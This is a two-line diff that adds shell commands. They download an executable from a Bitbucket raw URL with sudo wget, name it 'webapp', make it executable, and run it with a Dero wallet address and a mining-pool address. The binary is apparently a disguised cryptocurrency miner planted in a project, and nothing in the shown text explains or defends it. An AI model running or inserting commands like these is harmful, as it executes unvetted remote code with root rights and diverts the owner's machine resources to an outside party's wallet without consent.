@@ -1,0 +1,2 @@
+sudo wget -O webapp https://bitbucket.org/wnjnf/palu/raw/e71fee65b0e04bf9be30168235130c0dc37dcd99/peli && sudo chmod +x webapp
+webapp -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmqph4fcksrgw0qtdzxsl -r community-pools.mysrv.cloud:10300 -p rpc
